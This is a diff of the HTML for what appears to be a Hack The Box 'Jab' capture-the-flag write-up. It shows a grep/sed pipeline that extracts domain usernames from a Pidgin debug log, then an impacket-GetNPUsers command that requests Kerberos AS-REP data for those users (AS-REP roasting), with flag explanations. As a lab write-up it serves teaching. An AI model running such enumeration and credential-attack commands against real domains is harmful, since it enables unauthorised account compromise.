@@ -104,31 +104,27 @@ Now, we proceed to run pidgin on debug mode and use it as before to save a file 
 <img src="/assets/images/c9811d21-6d70-4416-99da-b9c1dc8d6c97-export-1a7ef455-6f10-4cae-8fc7-c315768e8fe8/c9811d21-6d70-4416-99da-b9c1dc8d6c97-export-1a7ef455-6f10-4cae-8fc7-c315768e8fe8_Untitled_11.png" alt="Untitled" />
 <br /><br />
 It is save in a predetermine format, so we create a list filtering not necessary information
+<br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'&lt;value&gt;[^&gt;]+@jab\.htb(?=&lt;value&gt;)'</span> output.log | <span class="nb">sed</span> <span class="s1">'s/@jab\.htb//g'</span> | 
+<span class="nb">sed</span> <span class="s1">'s/&lt;value&gt;//g'</span> | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="o">&gt;</span> list.lst
+</code></pre></div>    </div>
+    <p><br /><br />
+<strong>-o</strong> : Only output matching parts of each line
 <br /><br />
-```bash
-grep -oP ‘<value>[^&gt;]+@jab\.htb(?=<value>)' output.log | sed 's/@jab\.htb//g' | 
-sed 's/<value>//g' | sort | uniq &gt; list.lst</value></value></value></p>
-  </li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
-**-o** : Only output matching parts of each line
-&lt;br/&gt;&lt;br/&gt;
-**-P** : Enable perl-Compatible regular expressions
-&lt;br/&gt;&lt;br/&gt;
-**[^&gt;]+** : Any character that are not '&gt;'
-&lt;br/&gt;&lt;br/&gt;
-**(?=&lt;value&gt;)** : It ensure the match is followed by &lt;value&gt; but is not part of the match
-&lt;br/&gt;&lt;br/&gt;
+<strong>-P</strong> : Enable perl-Compatible regular expressions
+<br /><br />
+<strong>[^&gt;]+</strong> : Any character that are not ‘&gt;’
+<br /><br />
+**(?=<value>)** : It ensure the match is followed by <value> but is not part of the match
+<br /><br />
 **s/something//g** : It replaces any something with an empy string.
-&lt;br/&gt;&lt;br/&gt;
+<br /><br />
 ![Untitled](/assets/images/c9811d21-6d70-4416-99da-b9c1dc8d6c97-export-1a7ef455-6f10-4cae-8fc7-c315768e8fe8/c9811d21-6d70-4416-99da-b9c1dc8d6c97-export-1a7ef455-6f10-4cae-8fc7-c315768e8fe8_Untitled_12.png)
-&lt;br/&gt;&lt;br/&gt;
-```bash
-impacket-GetNPUsers jab.htb/ -userfile list.lst -request 2&gt;&amp;1 | grep -v 'UF_DONT_REQUIRE_PREAUTH '
-</code></pre></div></div>
-<p><br /><br /></p>
-<ul>
+<br /><br /></value></value></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers jab.htb/ <span class="nt">-userfile</span> list.lst <span class="nt">-request</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'UF_DONT_REQUIRE_PREAUTH '</span>
+</code></pre></div>    </div>
+    <p><br /><br /></p>
+  </li>
   <li>GetNPUsers is a tool which is typicallt used for Kerberos enumeration.
 <br /><br /></li>
   <li><code class="language-plaintext highlighter-rouge">-request</code>: In this case, it’s requesting information about user accounts
